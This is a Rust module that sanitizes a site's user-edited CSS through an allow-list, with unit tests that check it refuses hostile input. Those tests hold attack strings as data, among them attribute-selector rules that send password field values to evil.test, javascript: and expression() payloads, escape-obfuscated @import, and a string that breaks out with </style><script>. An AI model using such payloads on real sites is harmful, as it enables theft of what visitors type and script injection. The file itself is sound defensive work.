//! The site's own stylesheet, as an allow-list: the editor's text is parsed (`cssparser`, the CSS
//! Syntax tokenizer and block structure), only style rules and `@media`, `@supports`, `@keyframes`
//! and `@font-face` are kept, and the sheet is written out again from the tokens parsed, never from
//! the text given. Everything else is refused, with the reason:
//!
//! * every other at-rule (`@import`, `@namespace`, `@layer`, `@page`…), and `@charset` anywhere
//!   but first (where it is dropped: the sheet is served as UTF-8);
//! * every address (`url(…)`, and the strings of `image-set(…)`) that is not one of the site's own
//!   files: a public file (`/files/public/{id}`), the workspace's brand files
//!   (`/_brand/{workspace}/…`), or, outside `@font-face`, a small `data:` picture (PNG, JPEG, GIF,
//!   WebP, at most [`DATA_MAX`] bytes). So no rule can send what a visitor types to another host;
//! * a declaration that does not parse as `name: value` (a bad string or address, an unmatched
//!   bracket, a block where a value is), an `expression(…)`, `<!--` or `-->`;
//! * more than [`BYTES_MAX`] bytes, [`RULES_MAX`] rules or [`DEPTH_MAX`] nested at-rules.
//!
//! Escapes are decoded by the tokenizer before any of these checks (`u\72l(` is `url(`, `@\69mport`
//! is `@import`), and every identifier and string is escaped again when written.

use cssparser::{CowRcStr, Delimiter, ParseError, Parser, ToCss, Token, serialize_string};
use uuid::Uuid;

/// The longest sheet taken, in bytes.
pub(crate) const BYTES_MAX: usize = 50_000;
/// Rules at most (style rules, keyframes and at-rules each count one).
pub(crate) const RULES_MAX: usize = 2_000;
/// At-rules inside at-rules at most.
pub(crate) const DEPTH_MAX: usize = 8;
/// The largest `data:` picture taken, in bytes of its address.
pub(crate) const DATA_MAX: usize = 8_192;

type Refusal = ParseError<String>;

fn no<T>(why: impl Into<String>) -> Result<T, Refusal> {
    Err(ParseError::custom(why.into()))
}

/// What is being written: a selector or an at-rule's prelude, a value, or an `@font-face` value.
#[derive(Clone, Copy, PartialEq)]
enum Place {
    Prelude,
    Value,
    FontFace,
}

struct Writer<'w> {
    workspace: &'w str,
    out: String,
    rules: usize,
}

impl Writer<'_> {
    fn rule(&mut self) -> Result<(), Refusal> {
        self.rules += 1;
        if self.rules > RULES_MAX { no(format!("a sheet has at most {RULES_MAX} rules")) } else { Ok(()) }
    }

    fn token(&mut self, t: &Token) {
        // Writing to a String cannot fail.
        let _ = t.to_css(&mut self.out);
    }

    fn address(&mut self, url: &str) {
        self.out.push_str("url(");
        let _ = serialize_string(url, &mut self.out);
        self.out.push(')');
    }
}

/// Whether `url` is one of the site's own files a sheet may name (see the module's words).
pub(crate) fn address_ok(url: &str, workspace: &str, font: bool) -> bool {
    if let Some(id) = url.strip_prefix("/files/public/") {
        return id.parse::<Uuid>().is_ok();
    }
    if let Some(rest) = url.strip_prefix(&format!("/_brand/{workspace}/")) {
        return !rest.is_empty()
            && !rest.contains("..")
            && !rest.contains("//")
            && rest.bytes().all(|c| c.is_ascii_alphanumeric() || matches!(c, b'.' | b'_' | b'-' | b'/' | b'?' | b'='));
    }
    if !font && url.len() <= DATA_MAX {
        for kind in ["png", "jpeg", "gif", "webp"] {
            if let Some(data) = url.strip_prefix(&format!("data:image/{kind};base64,")) {
                return data.bytes().all(|c| c.is_ascii_alphanumeric() || matches!(c, b'+' | b'/' | b'='));
            }
        }
    }
    false
}

/// The editor's sheet as the site serves it: parsed, kept only where allowed, written out again.
/// `Err` says what was refused.
pub(crate) fn clean(source: &str, workspace: &str) -> Result<String, String> {
    if source.len() > BYTES_MAX {
        return Err(format!("a sheet is at most {BYTES_MAX} bytes"));
    }
    let source = source.strip_prefix('\u{feff}').unwrap_or(source);
    let mut p = Parser::new(source);
    let mut w = Writer { workspace, out: String::new(), rules: 0 };
    match rules(&mut p, &mut w, 0) {
        Ok(()) => Ok(w.out),
        Err(e) => Err(match e.kind {
            cssparser::ParseErrorKind::Custom(why) => why,
            cssparser::ParseErrorKind::Basic(_) => "the sheet does not parse here: a rule or a declaration is not complete".into(),
        }),
    }
}

/// A list of rules: the sheet, or the inside of `@media` and `@supports`.
fn rules<'i>(p: &mut Parser<'i>, w: &mut Writer, depth: usize) -> Result<(), Refusal> {
    let mut first = depth == 0;
    loop {
        let start = p.state();
        let token = match p.next() {
            Ok(t) => t.clone(),
            Err(_) => return Ok(()),
        };
        let at_first = std::mem::replace(&mut first, false);
        match token {
            Token::AtKeyword(name) => at_rule(p, w, &name, depth, at_first)?,
            Token::Semicolon => {}
            Token::CDO | Token::CDC => return no("<!-- and --> are not taken"),
            _ => {
                p.reset(&start);
                w.rule()?;
                prelude(p, w)?;
                w.out.push('{');
                p.parse_nested_block(|p| declarations(p, w, Place::Value))?;
                w.out.push('}');
            }
        }
    }
}

fn at_rule<'i>(p: &mut Parser<'i>, w: &mut Writer, name: &CowRcStr<'i>, depth: usize, first: bool) -> Result<(), Refusal> {
    let lower = name.to_ascii_lowercase();
    match lower.as_str() {
        "charset" if first => {
            // Dropped: the sheet is served as UTF-8.
            p.parse_until_after(Delimiter::Semicolon, |p| {
                while p.next().is_ok() {}
                Ok::<(), Refusal>(())
            })
        }
        "media" | "supports" => {
            if depth + 1 > DEPTH_MAX {
                return no(format!("at-rules go at most {DEPTH_MAX} deep"));
            }
            w.rule()?;
            w.out.push('@');
            w.out.push_str(&lower);
            w.out.push(' ');
            prelude(p, w)?;
            w.out.push('{');
            p.parse_nested_block(|p| rules(p, w, depth + 1))?;
            w.out.push('}');
            Ok(())
        }
        "keyframes" | "-webkit-keyframes" => {
            w.rule()?;
            w.out.push('@');
            w.out.push_str(&lower);
            w.out.push(' ');
            prelude(p, w)?;
            w.out.push('{');
            p.parse_nested_block(|p| keyframes(p, w))?;
            w.out.push('}');
            Ok(())
        }
        "font-face" => {
            w.rule()?;
            w.out.push_str("@font-face");
            prelude(p, w)?;
            w.out.push('{');
            p.parse_nested_block(|p| declarations(p, w, Place::FontFace))?;
            w.out.push('}');
            Ok(())
        }
        "charset" => no("@charset is taken only first"),
        _ => no(format!("@{lower} is not taken: only @media, @supports, @keyframes and @font-face")),
    }
}

/// A selector or an at-rule's prelude, up to and including its `{`; nothing else may end it.
fn prelude<'i>(p: &mut Parser<'i>, w: &mut Writer) -> Result<(), Refusal> {
    let mut space = false;
    loop {
        let token = match p.next_including_whitespace() {
            Ok(t) => t.clone(),
            Err(_) => return no("a rule has no { … } block"),
        };
        match token {
            Token::CurlyBracketBlock => {
                while w.out.ends_with(' ') {
                    w.out.pop();
                }
                return Ok(());
            }
            Token::WhiteSpace(_) => space = true,
            Token::Semicolon => return no("a rule has no { … } block"),
            other => {
                if space && other != Token::Comma && !w.out.ends_with(['{', '}', '(', ' ']) && !w.out.is_empty() {
                    w.out.push(' ');
                }
                space = false;
                component(p, w, &other, Place::Prelude)?;
            }
        }
    }
}

/// The keyframes of `@keyframes`: a selector (`from`, `to`, percentages) and declarations each.
fn keyframes<'i>(p: &mut Parser<'i>, w: &mut Writer) -> Result<(), Refusal> {
    while !p.is_exhausted() {
        w.rule()?;
        prelude(p, w)?;
        w.out.push('{');
        p.parse_nested_block(|p| declarations(p, w, Place::Value))?;
        w.out.push('}');
    }
    Ok(())
}

/// `@font-face`'s descriptors.
const FONT_FACE: &[&str] = &["font-family", "src", "font-style", "font-weight", "font-display", "font-stretch", "unicode-range"];

/// Declarations: `name: value;`, each written again; anything else refused.
fn declarations<'i>(p: &mut Parser<'i>, w: &mut Writer, place: Place) -> Result<(), Refusal> {
    loop {
        let name = match p.next() {
            Err(_) => return Ok(()),
            Ok(Token::Semicolon) => continue,
            Ok(Token::Ident(name)) => name.to_ascii_lowercase(),
            Ok(_) => return no("a declaration is name: value"),
        };
        if place == Place::FontFace && !FONT_FACE.contains(&name.as_str()) {
            return no(format!("@font-face does not take {name}"));
        }
        if p.expect_colon().is_err() {
            return no(format!("the declaration {name} has no value"));
        }
        let mark = w.out.len();
        let _ = cssparser::serialize_identifier(&name, &mut w.out);
        w.out.push(':');
        let before = w.out.len();
        p.parse_until_after(Delimiter::Semicolon, |p| value(p, w, place))?;
        if w.out.len() == before {
            w.out.truncate(mark);
            return no(format!("the declaration {name} has no value"));
        }
        w.out.push(';');
    }
}

/// A declaration's value, to its end.
fn value<'i>(p: &mut Parser<'i>, w: &mut Writer, place: Place) -> Result<(), Refusal> {
    let mut space = false;
    loop {
        let token = match p.next_including_whitespace() {
            Ok(t) => t.clone(),
            Err(_) => return Ok(()),
        };
        match token {
            Token::WhiteSpace(_) => space = true,
            other => {
                if space && other != Token::Comma && !w.out.ends_with([':', '(', ' ']) {
                    w.out.push(' ');
                }
                space = false;
                component(p, w, &other, place)?;
            }
        }
    }
}

/// One component of a prelude or a value, with what it holds when it is a function or a block.
fn component<'i>(p: &mut Parser<'i>, w: &mut Writer, token: &Token<'i>, place: Place) -> Result<(), Refusal> {
    match token {
        Token::UnquotedUrl(url) => {
            check(w, url, place)?;
            w.address(url);
            Ok(())
        }
        Token::Function(name) => {
            let lower = name.to_ascii_lowercase();
            match lower.as_str() {
                "url" | "src" => {
                    let url = p.parse_nested_block(|p| {
                        let url = p.expect_string().map_err(|_| ParseError::custom("an address is url(\"…\")".to_string()))?.as_ref().to_owned();
                        if !p.is_exhausted() {
                            return no("an address is url(\"…\")");
                        }
                        Ok(url)
                    })?;
                    check(w, &url, place)?;
                    w.address(&url);
                    Ok(())
                }
                "expression" | "javascript" | "behavior" | "-moz-binding" => no(format!("{lower}(…) is not taken")),
                _ => {
                    // image-set(…) and its kin name pictures by strings too: each is an address.
                    let images = matches!(lower.as_str(), "image-set" | "-webkit-image-set" | "image" | "cross-fade");
                    let _ = cssparser::serialize_identifier(&lower, &mut w.out);
                    w.out.push('(');
                    p.parse_nested_block(|p| if images { inside_images(p, w, place) } else { value(p, w, place) })?;
                    w.out.push(')');
                    Ok(())
                }
            }
        }
        Token::ParenthesisBlock | Token::SquareBracketBlock => {
            let (open, close) = if matches!(token, Token::ParenthesisBlock) { ('(', ')') } else { ('[', ']') };
            w.out.push(open);
            p.parse_nested_block(|p| value(p, w, place))?;
            w.out.push(close);
            Ok(())
        }
        Token::CurlyBracketBlock => no("a block is not taken here"),
        Token::AtKeyword(name) => no(format!("@{name} is not taken here")),
        Token::BadUrl(_) | Token::BadString(_) => no("a string or an address is not complete"),
        Token::CloseParenthesis | Token::CloseSquareBracket | Token::CloseCurlyBracket => no("a bracket closes that was not opened"),
        Token::CDO | Token::CDC => no("<!-- and --> are not taken"),
        Token::Semicolon => no("a ; is not taken here"),
        Token::Comment(_) | Token::WhiteSpace(_) => Ok(()),
        other => {
            w.token(other);
            Ok(())
        }
    }
}

/// The inside of `image-set(…)` and its kin: each string is an address.
fn inside_images<'i>(p: &mut Parser<'i>, w: &mut Writer, place: Place) -> Result<(), Refusal> {
    let mut space = false;
    loop {
        let token = match p.next_including_whitespace() {
            Ok(t) => t.clone(),
            Err(_) => return Ok(()),
        };
        match token {
            Token::WhiteSpace(_) => space = true,
            Token::QuotedString(url) => {
                if space && !w.out.ends_with(['(', ' ']) {
                    w.out.push(' ');
                }
                space = false;
                check(w, &url, place)?;
                w.address(&url);
            }
            other => {
                if space && !w.out.ends_with(['(', ' ']) {
                    w.out.push(' ');
                }
                space = false;
                component(p, w, &other, place)?;
            }
        }
    }
}

fn check(w: &Writer, url: &str, place: Place) -> Result<(), Refusal> {
    if place == Place::Prelude {
        return no("an address is not taken in a selector");
    }
    if address_ok(url, w.workspace, place == Place::FontFace) {
        Ok(())
    } else {
        no(format!("{url} is not one of the site's own files: a sheet names only public files (/files/public/…), the brand's files, or small data: pictures"))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const ID: &str = "0190f3a0-0000-7000-8000-000000000001";

    fn ok(css: &str) -> String {
        clean(css, "acme").unwrap_or_else(|e| panic!("{css:?} refused: {e}"))
    }

    fn refused(css: &str, because: &str) {
        match clean(css, "acme") {
            Ok(out) => panic!("{css:?} taken as {out:?}"),
            Err(e) => assert!(e.contains(because), "{css:?}: {e:?} does not say {because:?}"),
        }
    }

    #[test]
    fn style_rules_and_the_named_at_rules_are_kept() {
        assert_eq!(ok("a { color : red }"), "a{color:red;}");
        assert_eq!(ok("@media (min-width: 600px) { .x , .y { margin: 0 auto !important; } }"), "@media (min-width:600px){.x, .y{margin:0 auto !important;}}");
        assert_eq!(ok("@supports (display:grid) { main { display: grid } }"), "@supports (display:grid){main{display:grid;}}");
        assert_eq!(ok("@keyframes spin { from { opacity: 0 } to { opacity: 1 } }"), "@keyframes spin{from{opacity:0;}to{opacity:1;}}");
        assert!(
            ok(&format!("@font-face {{ font-family: Own; src: url(/files/public/{ID}) format(\"woff2\") }}"))
                .contains(&format!("src:url(\"/files/public/{ID}\") format(\"woff2\");"))
        );
        assert!(ok(&format!(".hero {{ background: url('/files/public/{ID}') }}")).contains(&format!("url(\"/files/public/{ID}\")")));
        assert!(ok(".logo { background-image: url(/_brand/acme/0190f3a0/logo?v=0a1b) }").contains("/_brand/acme/0190f3a0/logo?v=0a1b"));
        assert!(ok(".dot { background: url(data:image/png;base64,iVBORw0KGgo=) }").contains("data:image/png;base64,iVBORw0KGgo="));
    }

    #[test]
    fn import_is_refused() {
        refused("@import url(/files/public/x.css);", "@import is not taken");
        refused("a{color:red} @import 'x.css';", "@import is not taken");
    }

    #[test]
    fn namespace_and_unnamed_at_rules_are_refused() {
        refused("@namespace svg url(http://www.w3.org/2000/svg);", "@namespace is not taken");
        for rule in [
            "@layer base { a { color: red } }",
            "@page { margin: 0 }",
            "@container (min-width: 1px) { a { color: red } }",
            "@property --x { syntax: '*' }",
            "@document url-prefix() { a{} }",
        ] {
            refused(rule, "is not taken");
        }
    }

    #[test]
    fn charset_is_taken_only_first() {
        assert_eq!(ok("@charset \"utf-8\"; a{color:red}"), "a{color:red;}");
        refused("a{color:red} @charset \"utf-8\";", "@charset is taken only first");
    }

    #[test]
    fn addresses_on_another_host_are_refused() {
        for url in [
            "https://evil.test/a.png",
            "//evil.test/a.png",
            "http://evil.test/a.png",
            "/\\evil.test/a.png",
            "a.png",
            "/files/public/not-an-id",
            "/_brand/other/0190/logo",
            "/_brand/acme/../x",
        ] {
            refused(&format!("a {{ background: url({url:?}) }}"), "is not one of the site's own files");
        }
        refused("a { background: image-set(\"https://evil.test/a.png\" 1x) }", "is not one of the site's own files");
    }

    #[test]
    fn javascript_and_data_outside_small_pictures_are_refused() {
        refused("a { background: url(\"javascript:alert(1)\") }", "is not one of the site's own files");
        // Unquoted, its brackets make the address incomplete for the tokenizer: refused as such.
        refused("a { background: url(javascript:alert(1)) }", "not complete");
        refused("a { background: url('data:text/html;base64,PHNjcmlwdD4=') }", "is not one of the site's own files");
        refused("a { background: url('data:image/svg+xml;base64,PHN2Zz4=') }", "is not one of the site's own files");
        refused(&format!("a {{ background: url('data:image/png;base64,{}') }}", "A".repeat(DATA_MAX)), "is not one of the site's own files");
        refused("@font-face { font-family: x; src: url(data:image/png;base64,AAAA) }", "is not one of the site's own files");
        refused("a { width: expression(alert(1)) }", "expression(…) is not taken");
    }

    #[test]
    fn invalid_declarations_are_refused_not_passed_through() {
        refused("a { color red }", "has no value");
        refused("a { color: }", "has no value");
        refused("a { 12px: red }", "a declaration is name: value");
        refused("a { color: \"red\n\" }", "not complete");
        refused("a { color: red; b { color: blue } }", "the declaration b has no value");
        refused("a { color: red) }", "a bracket closes");
        refused("a { background: url(/files/public/x y) }", "not complete");
        refused("@font-face { color: red }", "@font-face does not take color");
        refused("<!-- a { color: red } -->", "<!-- and --> are not taken");
    }

    #[test]
    fn a_selector_cannot_send_typed_input_to_another_host() {
        refused("input[type=password][value^=\"a\"] { background: url(https://evil.test/?a) }", "is not one of the site's own files");
        refused("input[value$=\"z\"] { list-style: url(\"//evil.test/z\") }", "is not one of the site's own files");
        refused(&format!("a[href=\"x\"] url(/files/public/{ID}) {{ color: red }}"), "not taken in a selector");
    }

    #[test]
    fn a_sheet_over_the_limit_is_refused() {
        refused(&format!("a{{content:\"{}\"}}", "x".repeat(BYTES_MAX)), "at most 50000 bytes");
        refused(&"a{color:red}".repeat(RULES_MAX + 1), "at most 2000 rules");
        let deep = format!("{}a{{color:red}}{}", "@media all{".repeat(DEPTH_MAX + 1), "}".repeat(DEPTH_MAX + 1));
        refused(&deep, "at most 8 deep");
    }

    #[test]
    fn what_is_written_is_what_was_parsed() {
        let given = "/* a note */\n.hero  >  h2 , .x::after {\n  color : #123 ; content: \"a\\\"b\" /* c */ ;\n}\n";
        let out = ok(given);
        assert_eq!(out, ".hero > h2, .x::after{color:#123;content:\"a\\\"b\";}");
        assert_eq!(ok(&out), out, "writing it again changes nothing");
        assert!(!out.contains("note") && !out.contains("/*"));
    }

    /// Inputs that try to slip something past the parser: each is refused, or comes out written again with nothing
    /// that names an address elsewhere, an `@import`, or text the parser did not understand.
    #[test]
    fn hostile_inputs() {
        let table: &[(&str, Option<&str>)] = &[
            // Escapes that spell url( and @import: decoded first, then refused.
            ("a{background:u\\72l(https://evil.test)}", Some("is not one of the site's own files")),
            ("a{background:\\75rl(\"https://evil.test\")}", Some("is not one of the site's own files")),
            ("@\\69mport 'x.css';", Some("@import is not taken")),
            ("@IMPORT 'x.css';", Some("@import is not taken")),
            // Nested at-rules: an unnamed one inside a named one.
            ("@media all { @import 'x.css'; }", Some("@import is not taken")),
            ("@supports (display:grid) { @media print { @layer x { a{color:red} } } }", Some("@layer is not taken")),
            // A BOM first is not the sheet's; anywhere else it is a character.
            ("\u{feff}a{color:red}", None),
            // Unclosed comment and string: the tokenizer ends them at the end of the sheet; what comes out is written
            // again from tokens, closed.
            ("a{color:red} /* never closed", None),
            ("a{content:\"never closed", None),
            ("a{color:red", None),
            // A string that closes the rule inside it stays a string.
            ("a{content:\"}</style><script>alert(1)</script>\"}", None),
        ];
        for (css, refusal) in table {
            match refusal {
                Some(because) => refused(css, because),
                None => {
                    let out = ok(css);
                    assert!(!out.contains("evil") && !out.to_lowercase().contains("@import"), "{css:?} → {out:?}");
                    assert!(!out.starts_with('\u{feff}'), "{out:?}");
                    assert_eq!(ok(&out), out, "{css:?} → {out:?} is stable");
                    assert!(out.ends_with('}'), "{css:?} → {out:?} is closed");
                }
            }
        }
        assert_eq!(ok("a{content:\"}</style><script>\"}"), "a{content:\"}</style><script>\";}");
    }
}
